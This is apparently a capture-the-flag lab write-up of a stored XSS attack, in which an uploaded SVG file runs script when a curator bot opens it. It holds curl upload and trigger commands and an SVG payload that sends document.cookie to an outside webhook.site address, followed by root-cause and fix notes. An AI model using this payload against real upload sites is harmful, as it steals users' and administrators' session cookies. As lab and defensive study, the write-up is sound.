# InkBleed Pwnbox Lab - SVG Upload XSS Curator Bot

Date: 2026-07-08
Target type: CTF/lab
Bug class: Stored XSS via SVG upload, curator/admin bot abuse, cookie disclosure

## Observation

Image letterpress app at `https://026f85f17691.pwnbox-lab.com/`.

Initial page hints:

- "Drop your sheet, watch it bound into the binder, and share the link."
- "The curator reviews each new arrival in person."
- Upload endpoint: POST `/api/upload`
- Listing endpoint: GET `/api/files`
- Curator trigger: POST `/api/send` with `{ hash }`

Relevant frontend flow:

```javascript
await fetch('/api/upload', { method: 'POST', body: formData });
await fetch('/api/send', {
  method: 'POST',
  headers: { 'content-type': 'application/json' },
  body: JSON.stringify({ hash }),
});
```

## Hypothesis

If SVG uploads are accepted and served back from the app origin without sanitization, inline SVG script should execute when the curator bot opens the uploaded file URL.

## Evidence

PNG polyglot upload accepted:

```bash
printf '\x89PNG\r\n\x1a\n<script>document.title="xss"</script>' > proof.png
curl -sS -X POST "https://026f85f17691.pwnbox-lab.com/api/upload" -F "file=@proof.png;filename=proof.png;type=image/png"
```

Result:

```json
{"hash":"389ca692eb107090464266fad7a22cf0","url":"/uploads/389ca692eb107090464266fad7a22cf0.png"}
```

PNG remained `Content-Type: image/png` even with `?response-content-type=text/html`; no S3-style override on this target.

HTML upload rejected:

```json
{"error":"The press does not bind this kind of sheet."}
```

SVG upload accepted:

```bash
curl -sS -X POST "https://026f85f17691.pwnbox-lab.com/api/upload" -F "file=@xss.svg;filename=xss.svg;type=image/svg+xml"
```

Result:

```json
{"hash":"51fafccd1a771a66f9e07a8d9f3abbef","url":"/uploads/51fafccd1a771a66f9e07a8d9f3abbef.svg"}
```

Served as:

```http
Content-Type: image/svg+xml
```

Body retained script:

```xml
<svg xmlns="http://www.w3.org/2000/svg">
<script><![CDATA[
fetch('https://webhook.site/[uuid]?c='+encodeURIComponent(document.cookie));
]]></script>
</svg>
```

Curator dispatch:

```bash
curl -sS -X POST "https://026f85f17691.pwnbox-lab.com/api/send" \
  -H "Content-Type: application/json" \
  -d '{"hash":"51fafccd1a771a66f9e07a8d9f3abbef"}'
```

Webhook received:

```text
FLAG=pwnbox{8b3a1d7f4e0c2658a91b4d705ec38c2f}
```

## Test

1. Upload SVG with inline script.
2. Confirm `/uploads/{hash}.svg` serves unsanitized content from same origin.
3. Trigger `/api/send` for the uploaded hash.
4. Capture curator cookie/flag at webhook.

## Result

Confirmed chain:

```text
Malicious SVG upload
-> stored at /uploads/{hash}.svg
-> curator bot opens uploaded file
-> inline SVG script executes
-> FLAG cookie exfiltrated
```

Flag: `pwnbox{8b3a1d7f4e0c2658a91b4d705ec38c2f}`

## Why PNG/S3 path failed here

- Upload validation accepted PNG magic bytes, but download path is Express static serving.
- `response-content-type` override did not change headers.
- SVG upload was the simpler active-content primitive.

## Root cause

Unsanitized SVG uploads served from the application origin, combined with a curator bot that renders uploaded files and a non-HttpOnly flag cookie.

## Fix

- Disallow SVG or sanitize scripts/event handlers from uploaded SVG.
- Serve uploads from a separate cookieless origin.
- Set `HttpOnly` on sensitive cookies.
- Have curator/review bots inspect metadata only, not execute uploaded documents.

## Future checklist item

For image upload labs with reviewer bots, test SVG `<script>` uploads before PNG polyglot / `response-content-type` chains.
